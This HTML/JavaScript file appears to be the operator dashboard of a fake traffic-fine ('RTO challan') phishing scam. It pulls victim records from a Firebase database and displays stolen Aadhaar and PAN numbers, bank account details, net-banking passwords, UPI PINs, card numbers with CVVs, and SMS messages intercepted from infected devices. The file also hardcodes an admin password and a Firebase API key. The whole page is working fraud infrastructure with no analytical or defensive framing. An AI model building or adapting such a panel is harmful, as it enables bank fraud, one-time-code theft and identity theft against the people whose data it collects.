<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RTO Admin Panel - Secured</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
    <style>
        body { background-color: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }

        /* Login Screen Styles */
        #login-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #121212; z-index: 9999; display: flex;
            align-items: center; justify-content: center; color: white;
        }
        .login-box {
            background: #fff; padding: 40px; border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); color: #333; width: 100%; max-width: 400px;
        }

        /* Dashboard Styles */
        .sidebar { height: 100vh; overflow-y: auto; background: #fff; border-right: 1px solid #ddd; position: fixed; width: 25%; }
        .user-item { cursor: pointer; padding: 15px; border-bottom: 1px solid #eee; transition: 0.2s; }
        .user-item:hover { background-color: #f8f9fa; }
        .user-item.active { border-left: 5px solid #0d6efd; background-color: #e7f1ff; }
        .main-content { margin-left: 25%; padding: 25px; min-height: 100vh; }
        .data-card { background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-bottom: 25px; }
        .sms-item { border-bottom: 1px solid #f0f0f0; padding: 10px 0; }
        .sms-item:last-child { border-bottom: none; }
        .label-text { font-weight: 600; color: #4b5563; font-size: 0.85rem; margin-bottom: 2px; }
        .value-text { color: #111827; font-size: 1.1rem; margin-bottom: 12px; word-break: break-all; border-bottom: 1px solid #f3f4f6; padding-bottom: 4px; }
        .tag-id { font-family: monospace; font-size: 0.8rem; background: #e5e7eb; padding: 2px 6px; border-radius: 4px; }
        .sms-sender { color: #dc3545; font-weight: bold; }
        .sms-time { font-size: 0.75rem; color: #6b7280; }
    </style>
</head>
<body>

<!-- Login Screen -->
<div id="login-screen">
    <div class="login-box">
        <h3 class="text-center mb-4">RTO Admin Access</h3>
        <div class="mb-3">
            <label class="form-label">Enter Admin Password</label>
            <input type="password" id="admin-pass" class="form-control" placeholder="Password...">
        </div>
        <button class="btn btn-primary w-100" onclick="checkAuth()">Login</button>
        <div id="login-error" class="text-danger mt-3 text-center" style="display:none;">Invalid Password!</div>
    </div>
</div>

<!-- Main Dashboard Content -->
<div id="dashboard-content" style="display:none;">
    <div class="sidebar">
        <div class="p-3 bg-dark text-white d-flex justify-content-between align-items-center">
            <h5 class="m-0">RTO Devices</h5>
            <span class="badge bg-primary" id="user-count">0</span>
        </div>
        <div id="user-list">
            <div class="p-4 text-center text-muted">Waiting for data...</div>
        </div>
    </div>

    <div class="main-content">
        <div id="welcome-screen" class="text-center py-5 mt-5">
            <h2 class="text-muted">Welcome to Admin Dashboard</h2>
            <p>Select a user from the list to see captured data and SMS.</p>
            <button class="btn btn-outline-danger btn-sm mt-3" onclick="logout()">Logout</button>
        </div>

        <div id="user-data-screen" style="display: none;">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <div>
                    <h2 id="display-name" class="mb-0">User Details</h2>
                    <span class="tag-id" id="display-id">ID: ...</span>
                </div>
                <button class="btn btn-danger btn-sm" onclick="logout()">Logout</button>
            </div>

            <div class="row">
                <!-- User Information -->
                <div class="col-lg-6">
                    <div class="data-card">
                        <h5 class="border-bottom pb-2 mb-3 text-primary">Captured Details (Payment/Bank)</h5>
                        <div id="all-fields-container">
                            <!-- Fields injected here -->
                        </div>
                    </div>
                </div>

                <!-- SMS Logs -->
                <div class="col-lg-6">
                    <div class="data-card">
                        <h5 class="border-bottom pb-2 mb-3 text-success">Incoming SMS Messages</h5>
                        <div id="sms-logs" style="max-height: 650px; overflow-y: auto;">
                            <!-- SMS injected here -->
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    // Password set as requested
    const ADMIN_PASSWORD = "Zuhi@143";

    function checkAuth() {
        const inputPass = document.getElementById('admin-pass').value;
        if (inputPass === ADMIN_PASSWORD) {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('dashboard-content').style.display = 'block';
            startFirebase();
        } else {
            const errorDiv = document.getElementById('login-error');
            errorDiv.style.display = 'block';
            setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
        }
    }

    function logout() {
        location.reload();
    }

    // Support Enter key for login
    document.getElementById("admin-pass").addEventListener("keypress", function(e) {
        if (e.key === "Enter") checkAuth();
    });

    function startFirebase() {
        const firebaseConfig = {
            apiKey: "AIzaSyBxn_lMOEFBkQwBoTM_rGPAV2qaP8yLa1o",
            databaseURL: "https://rto-challan-b6f93-default-rtdb.firebaseio.com/",
            projectId: "rto-challan-b6f93"
        };

        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const labels = {
            fullName: "Full Name", mobileNumber: "Mobile Number", aadhaarNumber: "Aadhaar Number",
            panNumber: "PAN Number", motherName: "Mother's Name", accountNumber: "Account Number",
            ifscCode: "IFSC Code", netBankName: "Bank (Net Banking)", netUserId: "User ID",
            netPassword: "Password", upiBank: "UPI Bank", upiPin: "UPI PIN",
            card_number: "Card Number", expiry_date: "Expiry Date", cvv: "CVV"
        };

        let usersStore = {};

        db.ref('users').on('value', (snapshot) => {
            usersStore = snapshot.val() || {};
            const uids = Object.keys(usersStore);
            document.getElementById('user-count').innerText = uids.length;

            const listDiv = document.getElementById('user-list');
            listDiv.innerHTML = '';

            uids.reverse().forEach(uid => {
                const user = usersStore[uid];
                const displayName = (user.details && user.details.fullName) ? user.details.fullName : 'Device ' + uid.substring(0, 5);
                const subText = (user.details && user.details.mobileNumber) ? user.details.mobileNumber : uid;

                const item = document.createElement('div');
                item.className = 'user-item';
                item.innerHTML = `<strong>${displayName}</strong><br><small class="text-muted">${subText}</small>`;
                item.onclick = () => showUser(uid, item, usersStore, labels);
                listDiv.appendChild(item);
            });
        });
    }

    function showUser(uid, element, usersStore, labels) {
        document.querySelectorAll('.user-item').forEach(i => i.classList.remove('active'));
        element.classList.add('active');
        document.getElementById('welcome-screen').style.display = 'none';
        document.getElementById('user-data-screen').style.display = 'block';

        const user = usersStore[uid];
        const details = user.details || {};
        document.getElementById('display-name').innerText = details.fullName || 'User Details';
        document.getElementById('display-id').innerText = 'ID: ' + uid;

        const container = document.getElementById('all-fields-container');
        container.innerHTML = '';
        Object.keys(details).forEach(key => {
            const label = labels[key] || key;
            container.innerHTML += `
                <div class="field">
                    <div class="label-text text-uppercase">${label}</div>
                    <div class="value-text fw-bold">${details[key]}</div>
                </div>`;
        });

        const smsDiv = document.getElementById('sms-logs');
        smsDiv.innerHTML = '';
        if (user.sms) {
            Object.values(user.sms).reverse().forEach(sms => {
                const time = new Date(sms.timestamp).toLocaleString();
                smsDiv.innerHTML += `
                    <div class="sms-item">
                        <div class="d-flex justify-content-between mb-1">
                            <span class="sms-sender">${sms.sender}</span>
                            <span class="sms-time">${time}</span>
                        </div>
                        <div>${sms.message}</div>
                    </div>`;
            });
        } else {
            smsDiv.innerHTML = '<div class="text-center py-4 text-muted">No SMS recorded.</div>';
        }
    }
</script>

</body>
</html>
